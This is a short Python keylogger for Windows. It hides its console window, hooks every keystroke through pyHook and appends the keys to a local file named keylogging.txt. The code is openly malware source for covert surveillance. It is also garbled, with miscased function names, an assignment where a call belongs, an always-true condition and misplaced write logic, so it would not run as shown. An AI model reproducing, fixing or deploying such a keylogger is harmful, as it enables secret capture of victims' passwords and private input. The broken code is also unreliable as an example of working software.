import win32api
import win32console
import win32gui
import pythoncom,pyHook
win=win32console.GetconsoleWindow()
win32gui=ShowWindow(win,0)

def OnKeyboardEvent(event):
    if event.Ascii==5:
        _exit(1)
    if event.Ascii !=0 or 8:
        f=open('keylogging.txt','r+')
        buffer=f.read()
        f.close()
        f=open('keylogging.txt','w')
        keylog=chr(event.Ascii)
        if event.Ascii==13:
            keylog='/n'
            buffer=buffer+keylog
            f.write(buffer)
            f.close()
hm=pyhook.HookManager()
hm.KeyDown=OnkeyboardEvent
hm=HookKeyboard()
pythoncom.PumpMessages()
